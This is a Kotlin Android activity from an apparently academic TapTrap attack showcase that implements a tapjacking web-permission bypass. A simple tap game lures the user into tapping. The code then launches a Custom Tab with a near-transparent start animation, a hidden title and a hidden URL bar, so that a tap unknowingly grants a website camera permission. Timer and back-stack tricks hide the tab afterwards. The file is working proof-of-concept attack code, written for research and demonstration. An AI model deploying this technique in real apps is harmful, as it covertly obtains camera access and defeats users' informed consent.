package edu.hm.itsec.taptrapattackshowcase.web

import android.content.Intent
import android.graphics.Rect
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Looper
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.net.toUri
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.isVisible
import edu.hm.itsec.taptrapattackshowcase.Constants
import edu.hm.itsec.taptrapattackshowcase.R
import edu.hm.itsec.taptrapattackshowcase.databinding.ActivityTapGameWebBinding
import java.util.Random

/**
 * Activity to demonstrate Web Permission Bypass attack using TapTrap.
 * The activity starts a game with two buttons. The user has to tap on the right button to increase the score.
 * When the score=2, a CustomTab ist opened with a website that requests the camera web permission.
 * The user clicks the button and grants the permission.
 */
class TapGameWebActivity : AppCompatActivity() {

    private lateinit var binding: ActivityTapGameWebBinding

    private val TAG: String = "TapGameWebActivity"

    // game logic
    private val handler = android.os.Handler(Looper.getMainLooper())
    private val random = Random()
    private var screenWidth = 0
    private var screenHeight = 0

    // Delay constants (in milliseconds)
    private val APPEAR_DELAY: Long = 1000  // Time after tap before it reappears
    private val AUTOHIDE_DELAY: Long = 3000  // Time before it hides if not tapped

    // Runnables to conrtol each button's appearance
    private val runnableA = Runnable { showButton(binding.buttonA, binding.buttonB) }
    private val runnableB = Runnable { showButton(binding.buttonB, binding.buttonA) }

    private var score = 0

    private var granted: Boolean = false

    private var timer: CountDownTimer? = null

    private var transparencyDeactivated = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        binding = ActivityTapGameWebBinding.inflate(layoutInflater)

        val view = binding.rootLayoutTabGameWeb
        setContentView(view)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.rootLayoutTabGameWeb)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        transparencyDeactivated = intent.getBooleanExtra("transparencyDeactivated", false)

        onBackPressedDispatcher.addCallback(this, object: OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (!granted) {
                    // Start WebActivity with flags to prevent taking CustomTab from BackStack
                    val webActivity = Intent(this@TapGameWebActivity, WebActivity::class.java)
                    webActivity.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    startActivity(webActivity)
                    finish()
                } else {
                    if (isEnabled) {
                        isEnabled = false
                        onBackPressedDispatcher.onBackPressed()
                    } else {
                        finish()
                    }
                }
            }
        })

        // Wait for the layout to be drawn to get its dimensions
        binding.rootLayoutTabGameWeb.post {
            screenWidth = binding.rootLayoutTabGameWeb.width
            screenHeight = binding.rootLayoutTabGameWeb.height
            // Start the game!
            binding.rootLayoutTabGameWeb.postDelayed({
                handler.post(runnableA)
                handler.post(runnableB)
            }, 100)
        }

        // click listeners
        binding.buttonA.setOnClickListener {
            score++
            binding.scoreTextView.text = getString(R.string.score_0, score)
            // finish the game after 5 taps
            val message: String = if (granted) {
                "The web permission has been granted by you. Did you notice?"
            } else {
                "You did not grant the web permission. You won!"
            }
            if (score >= 5) {
                val gameOverDialog = GameOverDialog.newInstance(
                    "Game Over",
                    message)
                gameOverDialog.show(supportFragmentManager, "GameOverDialog")
            }
            handleTap(it, runnableA)
        }
        binding.buttonB.setOnClickListener {
            handleTap(it, runnableB)
        }
        binding.scoreTextView.text = getString(R.string.score_0, score)
    }

    /**
     * Handles the logic for when a button is tapped.
     */
    private fun handleTap(button: View, reShowRunable: Runnable) {
        button.visibility = View.INVISIBLE

        // Cancel the "auto-hide" runnable (stored in the tag)
        (button.tag as? Runnable)?.let { handler.removeCallbacks(it) }

        // Stop any other pending "show" commands for this button
        handler.removeCallbacks(reShowRunable)

        // Schedule this button to reappear after a delay
        handler.postDelayed(reShowRunable, APPEAR_DELAY)
    }

    private fun showButton(buttonToShow: Button, otherButton: Button) {
        // Don't run if the layout isn't ready
        if (screenWidth == 0 || screenHeight == 0) return

        // Get button dimensions
        buttonToShow.measure(View.MeasureSpec.UNSPECIFIED, View.MeasureSpec.UNSPECIFIED)
        val buttonWidth = buttonToShow.measuredWidth
        val buttonHeight = buttonToShow.measuredHeight

        var newX: Float
        var newY: Float

        if (buttonToShow == binding.buttonA && score == 2 && !granted) {
            newX = (screenWidth - buttonWidth) / 2f
            newY = (screenHeight - buttonHeight) / 2f
            startAttack()
        } else {
            val newRect = Rect()
            val otherRect = Rect()

            // Get the other button's position if it's visible
            if (otherButton.isVisible) {
                otherButton.getHitRect(otherRect)
            }

            var overlap: Boolean
            do {
                // Calculate a random top-left corner
                newX = random.nextInt(screenWidth - buttonWidth).toFloat()
                newY = random.nextInt(screenHeight - buttonHeight).toFloat()

                // Create a Rect for the button's ne potential position
                newRect.set(newX.toInt(), newY.toInt(), newX.toInt() + buttonWidth, newY.toInt() + buttonHeight)

                // Check for overlap only if the other button is currently visible
                overlap = if (otherButton.isVisible) {
                    Rect.intersects(newRect, otherRect)
                } else {
                    false // No other button, so no overlap
                }
            } while (overlap) // Loop until we find a non-overlapping spot
        }

        // Position and show the button
        buttonToShow.x = newX
        buttonToShow.y = newY
        buttonToShow.visibility = View.VISIBLE

        // Create a new runnable that will hide this button if it's not tapped
        val hideRunnable = Runnable {
            if (buttonToShow.isVisible) {
                buttonToShow.visibility = View.INVISIBLE
                // Schedule it to show again (as if it were a "miss")
                val reShowRunable = if (buttonToShow == binding.buttonA) runnableA else runnableB
                handler.postDelayed(reShowRunable, APPEAR_DELAY)
            }
        }
        // Store this runnable in the button's tag so we can cancel it on tap
        buttonToShow.tag = hideRunnable
        handler.postDelayed(hideRunnable, AUTOHIDE_DELAY)
    }

    /**
     * Clean up handlers when the app is paused to prevent memory leaks
     * and background activity.
     */
    override fun onPause() {
        super.onPause()
        // Remove all scheduled runnables
        handler.removeCallbacks(runnableA)
        handler.removeCallbacks(runnableB)
        (binding.buttonA.tag as? Runnable)?.let { handler.removeCallbacks(it) }
        (binding.buttonB.tag as? Runnable)?.let { handler.removeCallbacks(it) }
    }

    /**
     * Restart the game logic when the app is resumed.
     */
    override fun onResume() {
        super.onResume()
        // Only restart if the layout is ready
        if (screenWidth > 0) {
            // Use postDelayed to give a slight buffer
            handler.postDelayed(runnableA, APPEAR_DELAY)
            handler.postDelayed(runnableB, APPEAR_DELAY)
        }
    }

    /**
     * Called, when the user is redirected to the app from the website.
     */
    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        val data = intent.data
        if (data?.scheme == "myapp" && data.host == "web-permission-success") {
            granted = true
            timer?.cancel()
            binding.buttonA.performClick()
        }
    }

    /**
     * Starts CustomTab and hides it by a custom animation.
     * The activity is restarted after 6 seconds to hide the CustomTab.
     */
    private fun startAttack() {
        // Cancel attack if permission has already been granted
        if (granted) return

        Log.d(TAG, "Starting attack...")

        var fadeInAnimation = R.anim.fade_in_web_transparent
        if (transparencyDeactivated) {
            fadeInAnimation = R.anim.fade_in_web
        }

        // Create an Intent to open the CustomTabs activity
        val url = Constants.DEMO_WEBSITE_URL
        val customTabsIntent = CustomTabsIntent.Builder()
            .setShowTitle(false)
            .setUrlBarHidingEnabled(true)
            .setStartAnimations(
                this,
                fadeInAnimation,
                R.anim.fade_out
            )
            .build()

        customTabsIntent.launchUrl(this, url.toUri())

        // Relaunch the TapGameWebActivity to hide the CustomTab after 6 seconds
        timer = object : CountDownTimer(6000, 1000) {
            override fun onTick(millisUntilFinished: Long) {}

            override fun onFinish() {
                val tapGameWebActivityIntent = Intent(
                    this@TapGameWebActivity,
                    TapGameWebActivity::class.java
                )
                tapGameWebActivityIntent.putExtra("transparencyDeactivated", transparencyDeactivated)
                if (!granted) {
                    val toast = Toast(applicationContext)
                    toast.setText(R.string.failed_web_permission_toast)
                    toast.show()
                    startActivity(tapGameWebActivityIntent)
                    finish()
                }
            }
        }.start()
    }
}